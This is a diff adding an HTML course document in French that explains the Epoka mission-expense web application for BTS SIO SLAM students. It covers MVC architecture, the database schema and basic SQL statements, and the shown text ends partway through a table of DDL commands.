@@ -1,0 +1,2119 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<title>Cours Technique – Application Epoka — BTS SIO SLAM</title>
+<style>
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body { font-family: 'Segoe UI', Arial, sans-serif; font-size: 13px; color: #1a1a2e; background: #fff; line-height: 1.75; }
+
+/* ── COUVERTURE ── */
+.cover { page-break-after: always; min-height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; background: linear-gradient(135deg, #0f3460 0%, #16213e 100%); color: #fff; text-align: center; padding: 3rem 2rem; }
+.cover h1 { font-size: 3.5rem; font-weight: 900; letter-spacing: -2px; margin-bottom: .5rem; }
+.cover .sub { font-size: 1.3rem; opacity: .8; margin-bottom: 2.5rem; }
+.cover .badges { display: flex; flex-wrap: wrap; justify-content: center; gap: .5rem; margin-bottom: 3rem; }
+.cover .badge-pill { background: rgba(255,255,255,.15); border: 1px solid rgba(255,255,255,.3); border-radius: 50px; padding: .35rem 1.1rem; font-size: .85rem; }
+.cover .levels { display: flex; gap: 1rem; justify-content: center; flex-wrap: wrap; }
+.cover .level { background: rgba(255,255,255,.1); border-radius: 12px; padding: .8rem 1.5rem; font-size: .85rem; border: 1px solid rgba(255,255,255,.2); }
+.cover .level strong { display: block; font-size: 1rem; margin-bottom: .2rem; }
+
+/* ── LAYOUT ── */
+.container { max-width: 900px; margin: 0 auto; padding: 2rem 3rem; }
+
+/* ── TITRES ── */
+h1.part { font-size: 2.2rem; color: #0f3460; border-bottom: 4px solid #0f3460; padding-bottom: .6rem; margin: 3rem 0 1.5rem; page-break-before: always; }
+h1.part:first-of-type { page-break-before: avoid; }
+h2.sec { font-size: 1.25rem; color: #16213e; border-left: 5px solid #e94560; padding-left: .8rem; margin: 2rem 0 .8rem; }
+h3.sub { font-size: 1.05rem; color: #0f3460; margin: 1.5rem 0 .4rem; font-weight: 700; border-bottom: 1px dashed #d0d8ff; padding-bottom: .2rem; }
+h4.concept { font-size: .95rem; color: #e94560; margin: 1.2rem 0 .3rem; font-weight: 800; text-transform: uppercase; letter-spacing: .5px; }
+
+/* ── TAGS BTS ── */
+.bts-tag { display: inline-block; font-size: .72rem; font-weight: 700; padding: .15rem .55rem; border-radius: 4px; margin-left: .4rem; vertical-align: middle; }
+.bts-1 { background: #dbeafe; color: #1d4ed8; }
+.bts-2 { background: #dcfce7; color: #15803d; }
+.bts-both { background: #fef9c3; color: #854d0e; }
+
+/* ── TEXTE ── */
+p { margin-bottom: .75rem; }
+ul, ol { margin: .5rem 0 .9rem 1.5rem; }
+li { margin-bottom: .3rem; }
+strong { color: #0f3460; }
+
+/* ── CODE ── */
+code { background: #f0f4ff; border: 1px solid #c7d2fe; border-radius: 4px; padding: .1rem .4rem; font-family: 'Consolas', 'Courier New', monospace; font-size: .87rem; color: #c0392b; }
+pre { background: #1e2340; color: #e8eaf6; border-radius: 8px; padding: 1.2rem 1.5rem; margin: .8rem 0 1.2rem; overflow-x: auto; font-family: 'Consolas', 'Courier New', monospace; font-size: .82rem; line-height: 1.65; page-break-inside: avoid; white-space: pre-wrap; word-break: break-word; }
+pre .c  { color: #6272a4; font-style: italic; }
+pre .k  { color: #ff79c6; }
+pre .s  { color: #f1fa8c; }
+pre .f  { color: #50fa7b; }
+pre .v  { color: #bd93f9; }
+pre .n  { color: #8be9fd; }
+pre .kw { color: #ff79c6; font-weight: bold; }
+
+/* ── BOXES ── */
+.info  { background: #eff6ff; border-left: 4px solid #3b82f6; border-radius: 0 8px 8px 0; padding: .9rem 1.1rem; margin: .8rem 0; }
+.warn  { background: #fffbeb; border-left: 4px solid #f59e0b; border-radius: 0 8px 8px 0; padding: .9rem 1.1rem; margin: .8rem 0; }
+.ok    { background: #f0fdf4; border-left: 4px solid #22c55e; border-radius: 0 8px 8px 0; padding: .9rem 1.1rem; margin: .8rem 0; }
+.jury  { background: #fdf4ff; border-left: 4px solid #a855f7; border-radius: 0 8px 8px 0; padding: .9rem 1.1rem; margin: .8rem 0; }
+.exam  { background: #fff7ed; border-left: 4px solid #ea580c; border-radius: 0 8px 8px 0; padding: .9rem 1.1rem; margin: .8rem 0; }
+
+/* ── TABLEAUX ── */
+table { width: 100%; border-collapse: collapse; margin: .8rem 0 1.2rem; font-size: .88rem; page-break-inside: avoid; }
+th { background: #0f3460; color: #fff; padding: .6rem .9rem; text-align: left; }
+td { padding: .5rem .9rem; border-bottom: 1px solid #e5e7eb; vertical-align: top; }
+tr:nth-child(even) td { background: #f8faff; }
+th.ok-h { background: #15803d; }
+th.warn-h { background: #b45309; }
+th.info-h { background: #1d4ed8; }
+
+/* ── SCHÉMA BDD ── */
+.schema { background: #1e2340; color: #e8eaf6; border-radius: 8px; padding: 1.2rem 1.5rem; margin: .8rem 0; font-family: monospace; font-size: .82rem; line-height: 1.9; }
+.schema .tbl { color: #ff79c6; font-weight: bold; font-size: .9rem; }
+.schema .col { color: #8be9fd; }
+.schema .typ { color: #f1fa8c; }
+.schema .pk  { color: #50fa7b; font-weight: bold; }
+.schema .fk  { color: #ffb86c; }
+.schema .com { color: #6272a4; font-style: italic; }
+
+/* ── FLUX ── */
+.flow { display: flex; align-items: center; gap: .4rem; flex-wrap: wrap; margin: .8rem 0; }
+.fs { background: #0f3460; color: #fff; border-radius: 8px; padding: .4rem .9rem; font-size: .83rem; font-weight: 600; text-align: center; }
+.fa { color: #e94560; font-size: 1.4rem; font-weight: bold; }
+.fs.green { background: #15803d; }
+.fs.red { background: #991b1b; }
+.fs.orange { background: #b45309; }
+
+/* ── TABLE DES MATIÈRES ── */
+.toc { background: #f8faff; border: 1px solid #c7d2fe; border-radius: 8px; padding: 1.5rem 2rem; margin: 1.5rem 0 2rem; }
+.toc-title { color: #0f3460; font-size: 1.1rem; font-weight: 700; margin-bottom: 1rem; }
+.toc ol { margin-left: 1rem; }
+.toc li { margin-bottom: .15rem; color: #374151; }
+.toc .toc-sub { list-style: none; margin-left: 1.5rem; }
+.toc .toc-sub li::before { content: "→ "; color: #e94560; }
+
+/* ── LÉGENDE BTS ── */
+.legend { display: flex; gap: 1rem; flex-wrap: wrap; margin: 1rem 0 1.5rem; }
+.legend span { font-size: .8rem; padding: .2rem .7rem; border-radius: 4px; }
+
+@media print {
+  h1.part { page-break-before: always; }
+  pre, table, .info, .warn, .ok, .jury, .exam { page-break-inside: avoid; }
+  .cover { min-height: 100vh; }
+}
+</style>
+</head>
+<body>
+
+<!-- ██████████████████ COUVERTURE ██████████████████ -->
+<div class="cover">
+  <h1>Epoka</h1>
+  <div class="sub">Application Web de Gestion des Missions Professionnelles<br>Documentation technique complète — BTS SIO Option SLAM</div>
+  <div class="badges">
+    <span class="badge-pill">PHP 8 Orienté Objet</span>
+    <span class="badge-pill">MySQL / PDO</span>
+    <span class="badge-pill">Pattern MVC</span>
+    <span class="badge-pill">AJAX / JSON / Fetch API</span>
+    <span class="badge-pill">Bootstrap 5</span>
+    <span class="badge-pill">Sessions &amp; Sécurité</span>
+    <span class="badge-pill">WAMP / Apache</span>
+  </div>
+  <div class="levels">
+    <div class="level"><strong>🎓 BTS SIO 1ère année</strong>MCD/MPD · HTML/CSS/PHP · SQL · HTTP</div>
+    <div class="level"><strong>🎓 BTS SIO 2ème année</strong>POO · MVC · Sécurité · API REST · Sessions</div>
+    <div class="level"><strong>👔 Jury non-expert</strong>Fonctionnement global · Utilité métier</div>
+  </div>
+</div>
+
+<div class="container">
+
+<!-- ██████████████████ TABLE DES MATIÈRES ██████████████████ -->
+<div class="toc">
+  <div class="toc-title">Table des matières</div>
+  <ol>
+    <li><strong>Présentation pour un jury non-expert</strong> — ce que fait l'application, en clair</li>
+    <li><strong>Architecture globale</strong> — comment les fichiers s'organisent</li>
+    <li><strong>Base de données</strong> — MCD, MPD, SQL DDL, sécurité BDD</li>
+    <li><strong>Protocole HTTP et formulaires</strong> — GET, POST, cycle client/serveur</li>
+    <li><strong>Configuration et connexion PDO</strong> — accès à la base</li>
+    <li><strong>Fonctions utilitaires</strong> — helpers, sécurité, sessions</li>
+    <li><strong>Authentification</strong> — connexion, hachage, droits</li>
+    <li><strong>Programmation Orientée Objet (POO)</strong> — classes, méthodes, encapsulation</li>
+    <li><strong>Les Modèles</strong> — couche données, SQL avancé</li>
+    <li><strong>Les Contrôleurs</strong> — logique métier, pattern PRG</li>
+    <li><strong>Les Vues</strong> — templates PHP/HTML</li>
+    <li><strong>AJAX et APIs JSON</strong> — communication asynchrone</li>
+    <li><strong>Flux complet d'une mission</strong> — cycle de vie</li>
+    <li><strong>Sécurité web — OWASP</strong> — toutes les protections en place</li>
+    <li><strong>Notions BTS SIO SLAM — Récapitulatif</strong></li>
+    <li><strong>Glossaire technique</strong></li>
+    <li><strong>HTML5 / CSS3 / JavaScript</strong> — fondamentaux du web front-end</li>
+    <li><strong>Cryptographie et sécurité des échanges</strong> — TLS, AES, RSA, hachage</li>
+    <li><strong>Développement Android</strong> — Java, Activities, Intents, SQLite, Volley, GPS</li>
+    <li><strong>C# / .NET / Design Patterns avancés</strong> — DAO, ORM, Entity Framework, exceptions</li>
+    <li><strong>SQL Avancé</strong> — procédures stockées, triggers, vues, transactions ACID</li>
+  </ol>
+</div>
+
+<div class="legend">
+  <span class="bts-1">🔵 1ère année BTS SIO</span>
+  <span class="bts-2">🟢 2ème année BTS SIO</span>
+  <span class="bts-both">🟡 Les deux années</span>
+</div>
+
+<!-- ████████████████████████████████████████████████████
+     PARTIE 0 — JURY NON-EXPERT
+     ████████████████████████████████████████████████████ -->
+<h1 class="part" style="page-break-before:avoid">PARTIE 0 — Présentation pour un jury non-expert</h1>
+
+<div class="jury">
+  <strong>Cette section est rédigée sans jargon technique,</strong> pour permettre à toute personne — qu'elle soit informaticienne ou non — de comprendre ce qu'est l'application Epoka, pourquoi elle existe, et comment elle fonctionne au quotidien.
+</div>
+
+<h2 class="sec">À quoi sert Epoka ?</h2>
+<p>Epoka est un <strong>logiciel de gestion des déplacements professionnels</strong>. Dans une entreprise, lorsqu'un employé part en mission (visite d'un client, intervention sur site, formation…), il doit déclarer ce déplacement pour être remboursé de ses frais : carburant, hébergement, repas.</p>
+<p>Avant ce type de logiciel, tout se faisait sur papier ou par e-mail : l'employé remplissait un formulaire, l'envoyait par mail au responsable, le responsable l'imprimait, le signait, et le transmettait à la comptabilité. Ce processus était lent, source d'erreurs, et difficile à suivre.</p>
+<p><strong>Epoka automatise et digitalise ce processus de bout en bout.</strong></p>
+
+<h2 class="sec">Qui utilise l'application ?</h2>
+<table>
+  <tr><th>Type d'utilisateur</th><th>Ce qu'il peut faire</th></tr>
+  <tr><td><strong>Salarié standard</strong></td><td>Créer et modifier ses propres missions, consulter son historique</td></tr>
+  <tr><td><strong>Responsable (validateur)</strong></td><td>Tout ce que fait le salarié, plus : valider les missions de ses équipes</td></tr>
+  <tr><td><strong>Comptabilité (payeur)</strong></td><td>Valider les paiements des missions déjà validées</td></tr>
+  <tr><td><strong>Administrateur</strong></td><td>Tous les droits : gérer les salariés, agences, paramètres du système</td></tr>
+</table>
+
+<h2 class="sec">Le cycle de vie d'une mission en 3 étapes</h2>
+<div class="flow">
+  <div class="fs">① Salarié crée<br>la mission<br><small style="opacity:.7">(brouillon)</small></div>
+  <div class="fa">→</div>
+  <div class="fs green">② Responsable<br>valide<br><small style="opacity:.7">(validée)</small></div>
+  <div class="fa">→</div>
+  <div class="fs orange">③ Comptabilité<br>paie<br><small style="opacity:.7">(payée)</small></div>
+</div>
+<p>Chaque étape est tracée dans le logiciel avec une date. Il est impossible de sauter une étape : on ne peut pas payer une mission qui n'a pas été validée.</p>
+
+<h2 class="sec">Le calcul automatique des frais</h2>
+<p>Le logiciel calcule automatiquement le montant à rembourser :</p>
+<ul>
+  <li><strong>Frais de trajet</strong> = nombre de kilomètres × tarif au km (paramétrable, ex : 0,50 €/km)</li>
+  <li><strong>Frais d'hébergement</strong> = nombre de nuits × tarif par nuit (ex : 80 €/nuit)</li>
+</ul>
+<p>La base de données mémorise les distances entre les villes déjà utilisées. La prochaine fois que quelqu'un fait le même trajet, le kilométrage est rempli automatiquement.</p>
+
+<h2 class="sec">Le tableau de bord</h2>
+<p>À la connexion, chaque utilisateur voit un résumé personnalisé : combien de missions il a créées, combien sont en attente de validation, combien ont été payées. Le responsable voit en plus la liste des missions en attente de sa validation, avec un bouton pour les traiter directement.</p>
+
+<h2 class="sec">La gestion du profil</h2>
+<p>Chaque utilisateur peut personnaliser son profil en ajoutant une photo. En survolant son avatar dans la barre latérale gauche, une icône apparaît pour changer la photo — sans quitter la page, grâce à la technologie AJAX.</p>
+
+<div class="jury">
+  <strong>En résumé pour le jury :</strong> Epoka remplace un processus manuel (papier/email) par une application web sécurisée, accessible depuis n'importe quel ordinateur avec un navigateur, qui guide chaque acteur de l'entreprise dans son rôle et calcule automatiquement les remboursements.
+</div>
+
+<!-- ████████████████████████████████████████████████████
+     PARTIE 1 — ARCHITECTURE
+     ████████████████████████████████████████████████████ -->
+<h1 class="part">PARTIE 1 — Architecture globale du projet</h1>
+<span class="bts-tag bts-2">2ème année</span>
+
+<h2 class="sec">Le pattern MVC (Modèle-Vue-Contrôleur)</h2>
+<p>Epoka est construit sur le patron d'architecture <strong>MVC</strong>. Ce découpage est l'un des fondamentaux du développement web professionnel et figure dans le référentiel BTS SIO SLAM.</p>
+
+<table>
+  <tr><th>Couche</th><th>Responsabilité</th><th>Fichiers dans Epoka</th></tr>
+  <tr><td><strong>Modèle (M)</strong></td><td>Contient toutes les requêtes SQL. Représente les données.</td><td><code>models/Mission.php</code>, <code>Salarie.php</code>…</td></tr>
+  <tr><td><strong>Vue (V)</strong></td><td>Génère le HTML envoyé au navigateur. Aucune logique métier.</td><td><code>views/missions/index.php</code>…</td></tr>
+  <tr><td><strong>Contrôleur (C)</strong></td><td>Orchestre : reçoit la requête, appelle le modèle, passe les données à la vue.</td><td><code>controllers/MissionController.php</code>…</td></tr>
+</table>
+
+<div class="info">
+  <strong>Avantages du MVC :</strong> Si l'apparence change, on ne modifie que les vues. Si la base de données change de structure, on ne modifie que les modèles. Le code est plus maintenable et testable.
+</div>
+
+<h2 class="sec">Le Front Controller (point d'entrée unique)</h2>
+<p>Toutes les requêtes passent par <strong>un seul fichier</strong> : <code>index.php</code>. C'est le pattern "Front Controller". Il est beaucoup plus sécurisé que d'avoir un fichier PHP par page, car la configuration de sécurité est centralisée.</p>
+
+<div class="flow">
+  <div class="fs">Utilisateur<br>saisit une URL</div><div class="fa">→</div>
+  <div class="fs">Apache reçoit<br>la requête HTTP</div><div class="fa">→</div>
+  <div class="fs">index.php<br>(routeur)</div><div class="fa">→</div>
+  <div class="fs">Contrôleur<br>approprié</div><div class="fa">→</div>
+  <div class="fs">Modèle<br>(SQL)</div><div class="fa">→</div>
+  <div class="fs">Vue<br>(HTML)</div><div class="fa">→</div>
+  <div class="fs">Navigateur<br>affiche</div>
+</div>
+
+<h2 class="sec">Structure des dossiers</h2>
+<pre>
+Epoka/
+├── index.php                 ← Point d'entrée unique + routeur + APIs JSON
+├── config/
+│   └── database.php          ← Connexion PDO + création automatique des tables
+├── includes/
+│   └── helpers.php           ← Fonctions globales (redirect, escape, flash…)
+├── models/                   ← COUCHE DONNÉES — requêtes SQL uniquement
+│   ├── Mission.php
+│   ├── Salarie.php
+│   ├── Ville.php
+│   ├── Agence.php
+│   ├── Distance.php
+│   └── Parametre.php
+├── controllers/              ← COUCHE LOGIQUE — orchestre modèles et vues
+│   ├── AuthController.php    ← Connexion / déconnexion
+│   ├── MissionController.php ← CRUD missions + valider + payer
+│   ├── SalarieController.php
+│   ├── AgenceController.php
+│   ├── DistanceController.php
+│   └── ParametreController.php
+├── views/                    ← COUCHE PRÉSENTATION — HTML + PHP minimal
+│   ├── layout.php            ← En-tête HTML + sidebar + navigation (incluse partout)
+│   ├── layout_footer.php     ← Fermeture HTML + tous les scripts JS
+│   ├── login.php
+│   ├── dashboard.php
+│   ├── missions/ (index.php, form.php, detail.php)
+│   ├── salaries/ (index.php, form.php)
+│   ├── agences/  (index.php, form.php)
+│   ├── distances/(index.php, form.php)
+│   └── parametres/(index.php)
+├── assets/
+│   ├── css/style.css         ← Feuille de style personnalisée (thème liquid/dark)
+│   └── img/avatars/          ← Photos de profil des utilisateurs
+└── epoka_structure.sql       ← Script de création de la base de données
+</pre>
+
+<!-- ████████████████████████████████████████████████████
+     PARTIE 2 — BASE DE DONNÉES
+     ████████████████████████████████████████████████████ -->
+<h1 class="part">PARTIE 2 — Base de données</h1>
+
+<h2 class="sec">Le Modèle Conceptuel de Données (MCD) <span class="bts-tag bts-1">1ère année</span></h2>
+<p>Avant de créer les tables en SQL, on modélise les données et leurs relations avec un MCD (aussi appelé diagramme Entité-Association). Voici les entités du projet :</p>
+<ul>
+  <li><strong>VILLE</strong> : une commune française (nom + code postal)</li>
+  <li><strong>AGENCE</strong> : un bureau de l'entreprise, situé dans une ville</li>
+  <li><strong>SALARIÉ</strong> : un employé, rattaché à une agence</li>
+  <li><strong>MISSION</strong> : un déplacement d'un salarié entre deux villes</li>
+  <li><strong>DISTANCE</strong> : le kilométrage mémorisé entre deux villes</li>
+  <li><strong>PARAMETRE</strong> : les tarifs (prix/km, prix/nuit)</li>
+</ul>
+
+<p><strong>Cardinalités (règles de gestion) :</strong></p>
+<table>
+  <tr><th>Relation</th><th>Cardinalité</th><th>Sens</th></tr>
+  <tr><td>AGENCE — VILLE</td><td>N,1</td><td>Plusieurs agences peuvent être dans la même ville. Une agence est dans exactement une ville.</td></tr>
+  <tr><td>SALARIÉ — AGENCE</td><td>N,1</td><td>Plusieurs salariés peuvent appartenir à la même agence. Un salarié appartient à 0 ou 1 agence.</td></tr>
+  <tr><td>MISSION — SALARIÉ</td><td>N,1</td><td>Un salarié peut avoir plusieurs missions. Chaque mission appartient à un seul salarié.</td></tr>
+  <tr><td>MISSION — VILLE (départ)</td><td>N,1</td><td>Plusieurs missions peuvent partir de la même ville.</td></tr>
+  <tr><td>MISSION — VILLE (arrivée)</td><td>N,1</td><td>Plusieurs missions peuvent arriver à la même ville.</td></tr>
+</table>
+
+<h2 class="sec">Le Modèle Physique de Données (MPD) <span class="bts-tag bts-1">1ère année</span></h2>
+<p>Le MPD est la traduction du MCD en tables SQL avec leurs colonnes, types, clés primaires et clés étrangères.</p>
+
+<div class="schema">
+<span class="tbl">TABLE ville</span>
+  <span class="col">id</span>           <span class="typ">INT</span>          <span class="pk">PRIMARY KEY AUTO_INCREMENT</span>
+  <span class="col">nom</span>          <span class="typ">VARCHAR(100)</span>
+  <span class="col">code_postal</span>  <span class="typ">VARCHAR(10)</span>
+
+<span class="tbl">TABLE agence</span>
+  <span class="col">id</span>           <span class="typ">INT</span>          <span class="pk">PRIMARY KEY AUTO_INCREMENT</span>
+  <span class="col">adresse</span>      <span class="typ">VARCHAR(255)</span>
+  <span class="col">id_ville</span>     <span class="typ">INT</span>          <span class="fk">→ FOREIGN KEY (ville.id) ON DELETE RESTRICT</span>
+
+<span class="tbl">TABLE salarie</span>
+  <span class="col">id</span>            <span class="typ">INT</span>          <span class="pk">PRIMARY KEY AUTO_INCREMENT</span>
+  <span class="col">fonction</span>      <span class="typ">VARCHAR(100)</span>
+  <span class="col">nom</span>           <span class="typ">VARCHAR(100)</span>
+  <span class="col">prenom</span>        <span class="typ">VARCHAR(100)</span>
+  <span class="col">mot_de_passe</span>  <span class="typ">VARCHAR(255)</span> <span class="com">-- hash bcrypt, jamais le vrai mot de passe</span>
+  <span class="col">peut_valider</span>  <span class="typ">TINYINT(1)</span>   <span class="com">-- 0 = non, 1 = oui</span>
+  <span class="col">peut_payer</span>    <span class="typ">TINYINT(1)</span>   <span class="com">-- 0 = non, 1 = oui</span>
+  <span class="col">id_agence</span>     <span class="typ">INT</span>          <span class="fk">→ FOREIGN KEY (agence.id) ON DELETE SET NULL</span>
+
+<span class="tbl">TABLE mission</span>
+  <span class="col">id</span>               <span class="typ">INT</span>          <span class="pk">PRIMARY KEY AUTO_INCREMENT</span>
+  <span class="col">intitule</span>         <span class="typ">VARCHAR(255)</span>
+  <span class="col">date_debut</span>       <span class="typ">DATE</span>
+  <span class="col">date_fin</span>         <span class="typ">DATE</span>
+  <span class="col">id_ville_depart</span>  <span class="typ">INT</span>          <span class="fk">→ FOREIGN KEY (ville.id) ON DELETE RESTRICT</span>
+  <span class="col">id_ville_arrivee</span> <span class="typ">INT</span>          <span class="fk">→ FOREIGN KEY (ville.id) ON DELETE RESTRICT</span>
+  <span class="col">id_salarie</span>       <span class="typ">INT</span>          <span class="fk">→ FOREIGN KEY (salarie.id) ON DELETE CASCADE</span>
+  <span class="col">statut</span>           <span class="typ">ENUM('brouillon','validee','payee')</span> DEFAULT 'brouillon'
+
+<span class="tbl">TABLE distance</span>
+  <span class="col">id</span>               <span class="typ">INT</span>          <span class="pk">PRIMARY KEY AUTO_INCREMENT</span>
+  <span class="col">id_ville_depart</span>  <span class="typ">INT</span>          <span class="fk">→ FOREIGN KEY (ville.id)</span>
+  <span class="col">id_ville_arrivee</span> <span class="typ">INT</span>          <span class="fk">→ FOREIGN KEY (ville.id)</span>
+  <span class="col">km</span>               <span class="typ">INT</span>
+
+<span class="tbl">TABLE parametre</span>
+  <span class="col">id</span>               <span class="typ">INT</span>          <span class="pk">PRIMARY KEY AUTO_INCREMENT</span>
+  <span class="col">prix_km</span>          <span class="typ">DECIMAL(10,2)</span> <span class="com">-- ex: 0.50 (€/km)</span>
+  <span class="col">prix_hebergement</span> <span class="typ">DECIMAL(10,2)</span> <span class="com">-- ex: 80.00 (€/nuit)</span>
+</div>
+
+<h2 class="sec">Clés étrangères et intégrité référentielle <span class="bts-tag bts-1">1ère année</span></h2>
+<p>Une <strong>clé étrangère</strong> est une contrainte qui garantit qu'une valeur dans une colonne correspond toujours à une valeur existante dans une autre table. Cela s'appelle l'<strong>intégrité référentielle</strong>.</p>
+
+<table>
+  <tr><th>Clé étrangère</th><th>Comportement ON DELETE</th><th>Pourquoi ce choix ?</th></tr>
+  <tr><td><code>agence.id_ville → ville.id</code></td><td><strong>RESTRICT</strong> — interdit la suppression</td><td>On ne peut pas supprimer Paris si une agence y est rattachée</td></tr>
+  <tr><td><code>salarie.id_agence → agence.id</code></td><td><strong>SET NULL</strong> — met à null</td><td>Si une agence ferme, le salarié reste en base (id_agence = NULL)</td></tr>
+  <tr><td><code>mission.id_salarie → salarie.id</code></td><td><strong>CASCADE</strong> — supprime en cascade</td><td>Si un salarié est supprimé, toutes ses missions sont supprimées aussi</td></tr>
+  <tr><td><code>mission.id_ville_* → ville.id</code></td><td><strong>RESTRICT</strong></td><td>On ne peut pas supprimer une ville utilisée dans une mission</td></tr>
+</table>
+
+<h2 class="sec">Requêtes SQL essentielles <span class="bts-tag bts-both">Les deux années</span></h2>
+
+<h3 class="sub">SELECT avec JOIN</h3>
+<p>Pour afficher la liste des missions avec le nom du salarié et des villes, on a besoin de <strong>jointures</strong>. La table <code>mission</code> ne stocke que les IDs ; les noms sont dans d'autres tables.</p>
+<pre>
+<span class="kw">SELECT</span> m.*,
+       s.nom           <span class="kw">AS</span> salarie_nom,
+       s.prenom        <span class="kw">AS</span> salarie_prenom,
+       vd.nom          <span class="kw">AS</span> ville_depart_nom,
+       va.nom          <span class="kw">AS</span> ville_arrivee_nom
+<span class="kw">FROM</span>   mission m
+<span class="kw">JOIN</span>   salarie s  <span class="kw">ON</span> m.id_salarie       = s.id
+<span class="kw">JOIN</span>   ville   vd <span class="kw">ON</span> m.id_ville_depart  = vd.id
+<span class="kw">JOIN</span>   ville   va <span class="kw">ON</span> m.id_ville_arrivee = va.id
+<span class="kw">ORDER BY</span> m.date_debut <span class="kw">DESC</span>;
+
+<span class="c">-- Ici on joint DEUX FOIS la table ville avec deux alias différents (vd et va)
+-- car une mission a DEUX villes (départ ET arrivée).
+-- JOIN = INNER JOIN : ne retourne que les lignes qui ont une correspondance des deux côtés.</span>
+</pre>
+
+<h3 class="sub">INSERT — Créer une mission</h3>
+<pre>
+<span class="kw">INSERT INTO</span> mission
+    (intitule, date_debut, date_fin, id_ville_depart, id_ville_arrivee, id_salarie, statut)
+<span class="kw">VALUES</span>
+    (<span class="s">'Formation PHP'</span>, <span class="s">'2025-03-10'</span>, <span class="s">'2025-03-12'</span>, 1, 42, 5, <span class="s">'brouillon'</span>);
+</pre>
+
+<h3 class="sub">UPDATE — Changer le statut</h3>
+<pre>
+<span class="c">-- Valider une mission (brouillon → validée)</span>
+<span class="kw">UPDATE</span> mission
+<span class="kw">SET</span>    statut = <span class="s">'validee'</span>
+<span class="kw">WHERE</span>  id = 7
+  <span class="kw">AND</span>  statut = <span class="s">'brouillon'</span>;   <span class="c">-- garde-fou : on ne peut pas valider deux fois</span>
+
+<span class="c">-- Marquer comme payée (validée → payée)</span>
+<span class="kw">UPDATE</span> mission
+<span class="kw">SET</span>    statut = <span class="s">'payee'</span>
+<span class="kw">WHERE</span>  id = 7
+  <span class="kw">AND</span>  statut = <span class="s">'validee'</span>;
+</pre>
+
+<h3 class="sub">DELETE</h3>
+<pre>
+<span class="kw">DELETE FROM</span> mission <span class="kw">WHERE</span> id = 7;
+<span class="c">-- Grâce à la FK ON DELETE CASCADE, les données liées seront supprimées si nécessaire.</span>
+</pre>
+
+<h3 class="sub">Requête symétrique pour la distance</h3>
+<pre>
+<span class="c">-- La distance Paris→Lyon est la même que Lyon→Paris.
+-- On cherche donc les deux combinaisons dans une seule requête :</span>
+<span class="kw">SELECT</span> * <span class="kw">FROM</span> distance
+<span class="kw">WHERE</span> (id_ville_depart = ? <span class="kw">AND</span> id_ville_arrivee = ?)
+   <span class="kw">OR</span> (id_ville_depart = ? <span class="kw">AND</span> id_ville_arrivee = ?);
+<span class="c">-- Paramètres : [idA, idB, idB, idA] — on inverse les deux derniers</span>
+</pre>
+
+<h2 class="sec">Pourquoi InnoDB et pas MyISAM ? <span class="bts-tag bts-1">1ère année</span></h2>
+<table>
+  <tr><th>Fonctionnalité</th><th class="ok-h">InnoDB ✓</th><th class="warn-h">MyISAM ✗</th></tr>
+  <tr><td>Clés étrangères</td><td>Oui</td><td>Non</td></tr>
+  <tr><td>Transactions (COMMIT/ROLLBACK)</td><td>Oui</td><td>Non</td></tr>
+  <tr><td>Intégrité référentielle</td><td>Garantie</td><td>Non garantie</td></tr>
+  <tr><td>Verrous au niveau de la ligne</td><td>Oui (performances)</td><td>Non (table entière)</td></tr>
+</table>
+<p>Epoka utilise <code>ENGINE=InnoDB</code> pour toutes ses tables afin de bénéficier des clés étrangères et des transactions.</p>
+
+<h2 class="sec">SQL DDL — Définir les données <span class="bts-tag bts-1">1ère année</span></h2>
+<p>Le DDL (Data Definition Language) regroupe les commandes qui <strong>définissent la structure</strong> de la base de données (tables, colonnes, contraintes), par opposition au DML (Data Manipulation Language : SELECT/INSERT/UPDATE/DELETE).</p>
+
+<h3 class="sub">CREATE TABLE</h3>
+<pre>
+<span class="kw">CREATE TABLE</span> <span class="k">IF NOT EXISTS</span> mission (
+    id               <span class="k">INT</span>            <span class="kw">PRIMARY KEY AUTO_INCREMENT</span>,
+    intitule         <span class="k">VARCHAR(255)</span>   <span class="k">NOT NULL</span>,
+    date_debut       <span class="k">DATE</span>           <span class="k">NOT NULL</span>,
+    date_fin         <span class="k">DATE</span>           <span class="k">NOT NULL</span>,
+    statut           <span class="k">ENUM</span>(<span class="s">'brouillon'</span>,<span class="s">'validee'</span>,<span class="s">'payee'</span>) <span class="k">DEFAULT</span> <span class="s">'brouillon'</span>,
+    id_salarie       <span class="k">INT</span>            <span class="k">NOT NULL</span>,
+    id_ville_depart  <span class="k">INT</span>            <span class="k">NOT NULL</span>,
+    id_ville_arrivee <span class="k">INT</span>            <span class="k">NOT NULL</span>,
+    <span class="kw">FOREIGN KEY</span> (id_salarie)       <span class="kw">REFERENCES</span> salarie(id) <span class="k">ON DELETE CASCADE</span>,
+    <span class="kw">FOREIGN KEY</span> (id_ville_depart)  <span class="kw">REFERENCES</span> ville(id)   <span class="k">ON DELETE RESTRICT</span>,
+    <span class="kw">FOREIGN KEY</span> (id_ville_arrivee) <span class="kw">REFERENCES</span> ville(id)   <span class="k">ON DELETE RESTRICT</span>
+) <span class="k">ENGINE</span>=InnoDB <span class="k">DEFAULT CHARSET</span>=utf8mb4;
+</pre>
+
+<h3 class="sub">ALTER TABLE — Modifier une table existante</h3>
+<pre>
+<span class="c">-- Ajouter une colonne</span>
+<span class="kw">ALTER TABLE</span> mission <span class="kw">ADD COLUMN</span> nb_repas <span class="k">INT DEFAULT</span> 0;
+
+<span class="c">-- Modifier le type d'une colonne</span>
+<span class="kw">ALTER TABLE</span> salarie <span class="kw">MODIFY COLUMN</span> prenom <span class="k">VARCHAR(150) NOT NULL</span>;
+
+<span class="c">-- Supprimer une colonne</span>
+<span class="kw">ALTER TABLE</span> mission <span class="kw">DROP COLUMN</span> nb_repas;
+
+<span class="c">-- Renommer une colonne (MySQL 8+)</span>
+<span class="kw">ALTER TABLE</span> salarie <span class="kw">RENAME COLUMN</span> mot_de_passe <span class="k">TO</span> mdp_hash;
+</pre>
+
+<h3 class="sub">DROP, TRUNCATE</h3>
+<pre>
+<span class="c">-- Supprimer définitivement une table (structure + données)</span>
+<span class="kw">DROP TABLE IF EXISTS</span> mission;
+
+<span class="c">-- Vider une table sans la supprimer (plus rapide que DELETE FROM sans WHERE)</span>
+<span class="kw">TRUNCATE TABLE</span> distance;
+<span class="c">-- ⚠ TRUNCATE réinitialise l'AUTO_INCREMENT, DELETE non.</span>
+</pre>
+
+<table>
+  <tr><th>Commande DDL</th><th>Rôle</th></tr>
